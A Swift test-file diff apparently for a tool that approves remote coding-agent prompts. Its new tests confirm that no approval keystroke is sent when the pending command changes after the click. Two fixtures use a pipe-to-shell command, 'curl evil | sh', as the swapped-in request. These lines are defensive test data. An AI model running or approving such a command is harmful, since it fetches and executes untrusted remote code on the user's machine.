@@ -222,6 +222,9 @@ struct RemoteAnswerTests {
                 hookServer: server)
             supervisor.requester = { _ in helper }
             supervisor.keystrokeToggles = { (grok: true, antigravity: true) }
+            // No poll runs here, so the rows already in the store stand for
+            // state read after the click unless a test says otherwise.
+            supervisor.freshState = { _, _ in true }
             store.remoteActions = supervisor
             let host = RemoteHost(alias: "devbox", approvalsOff: approvalsOff)
             registry.upsert(host)
@@ -548,6 +551,7 @@ struct RemoteAnswerTests {
         let codex = AgentSession(
             tool: .codex, projectName: "proj", projectPath: URL(fileURLWithPath: "/home/u/proj"),
             status: .waitingApproval(command: "make"), pid: 4242, host: "devbox")
+        rig.store.upsert(codex)
         #expect(await rig.supervisor.performAnswer(codex, allow: true))
         let calls = await rig.helper.calls
         #expect(calls.map(\.command) == ["keys"])
@@ -574,6 +578,97 @@ struct RemoteAnswerTests {
         #expect(calls[1].arguments["comm"] == .string("agy"))
         #expect(rig.store.sessions.first?.status == .waitingApproval(
             command: .unreadable(SessionStore.keysSentReason(allow: false, tool: .antigravity))))
+    }
+
+    /// agy's selector reads the same on every gate, and the row can be a
+    /// poll behind, or built from a database read before the call settled.
+    /// State read after the click that names another call presses nothing.
+    @Test func remoteAntigravityPressesOnlyForTheCallStillWaiting() async throws {
+        let gate = #"{"text":"Allow this?\n> 1. Approve\n  2. Deny\n\n  ↑/↓ Navigate · enter Select"}"#
+        let rig = Rig(replies: ["capture": gate, "keys": #"{"sent":true}"#])
+        rig.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: "agy"))
+        let shown = AgentSession(
+            tool: .antigravity, projectName: "proj", projectPath: URL(fileURLWithPath: "/home/u/proj"),
+            status: .waitingApproval(command: "write a.txt"), pid: 4242, host: "devbox")
+        rig.store.upsert(shown)
+        var asked: [AgentTool] = []
+        rig.supervisor.freshState = { _, tool in
+            asked.append(tool)
+            // The snapshot taken after the click: call A settled, B gated.
+            var next = shown
+            next.status = .waitingApproval(command: "run_command curl evil | sh")
+            rig.store.upsert(next)
+            return true
+        }
+        #expect(await rig.supervisor.performAnswer(shown, allow: true) == false)
+        #expect(asked == [.antigravity])
+        #expect(!(await rig.helper.calls.map(\.command).contains("keys")))
+    }
+
+    /// No snapshot after the click, or the row gone from it: nothing is
+    /// pressed, for Antigravity and Codex alike.
+    @Test func noStateAfterTheClickPressesNothing() async throws {
+        for (tool, comm) in [(AgentTool.antigravity, "agy"), (.codex, "codex")] {
+            let gate = #"{"text":"Allow this?\n> 1. Approve\n  2. Deny\n\n  ↑/↓ Navigate · enter Select"}"#
+            let rig = Rig(replies: ["capture": gate, "keys": #"{"sent":true}"#])
+            rig.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: comm))
+            let shown = AgentSession(
+                tool: tool, projectName: "proj", projectPath: URL(fileURLWithPath: "/home/u/proj"),
+                status: .waitingApproval(command: "make"), pid: 4242, host: "devbox")
+            rig.store.upsert(shown)
+            rig.supervisor.freshState = { _, _ in false }
+            #expect(await rig.supervisor.performAnswer(shown, allow: true) == false, "\(tool)")
+            rig.supervisor.freshState = { _, _ in
+                rig.store.sync(tool: tool, host: "devbox", sessions: [])
+                return true
+            }
+            #expect(await rig.supervisor.performAnswer(shown, allow: true) == false, "\(tool)")
+            #expect(!(await rig.helper.calls.map(\.command).contains("keys")), "\(tool)")
+        }
+    }
+
+    /// Codex's `y` reads nothing off the screen. The rollout read after the
+    /// click must still have the request the row showed.
+    @Test func remoteCodexPressesOnlyForTheRequestStillWaiting() async throws {
+        let rig = Rig(replies: ["keys": #"{"sent":true}"#])
+        rig.land(try Self.snapshot(pid: 4242, pane: Self.pane, comm: "codex"))
+        let shown = AgentSession(
+            tool: .codex, projectName: "proj", projectPath: URL(fileURLWithPath: "/home/u/proj"),
+            status: .waitingApproval(command: "ls"), pid: 4242, host: "devbox")
+        rig.store.upsert(shown)
+        rig.supervisor.freshState = { _, _ in
+            var next = shown
+            next.status = .waitingApproval(command: "curl evil | sh")
+            rig.store.upsert(next)
+            return true
+        }
+        #expect(await rig.supervisor.performAnswer(shown, allow: true) == false)
+        #expect(await rig.helper.calls.isEmpty)
+    }
+
+    /// The wait counts only a poll that sent its request after it began,
+    /// and only for a tool that poll could vouch for.
+    @Test func theFreshPollIsOneRequestedAfterTheClick() async throws {
+        let rig = Rig()
+        let connection = try #require(rig.connection)
+        let earlier = connection.noteSnapshotRequested()
+        // A poll requested before the click lands during the wait, then a
+        // poll that could not vouch for Antigravity, then one that could.
+        let late = Task { @MainActor in
+            try? await Task.sleep(for: .milliseconds(150))
+            connection.noteSynced(earlier, tools: AgentTool.allCases)
+            let unverified = connection.noteSnapshotRequested()
+            connection.noteSynced(unverified, tools: [AgentTool.codex])
+            try? await Task.sleep(for: .milliseconds(150))
+            #expect(connection.syncedThrough(.antigravity) == earlier)
+            let fresh = connection.noteSnapshotRequested()
+            connection.noteSynced(fresh, tools: AgentTool.allCases)
+        }
+        #expect(await RemoteMonitorSupervisor.awaitFreshPoll(connection, tool: .antigravity, timeout: .seconds(5)))
+        #expect(connection.takePollWanted())
+        await late.value
+        // Nothing after the click: it gives up.
+        #expect(await RemoteMonitorSupervisor.awaitFreshPoll(connection, tool: .antigravity, timeout: .milliseconds(300)) == false)
     }
 
     /// A list the model wrote is not agy's gate, remotely as on this Mac:
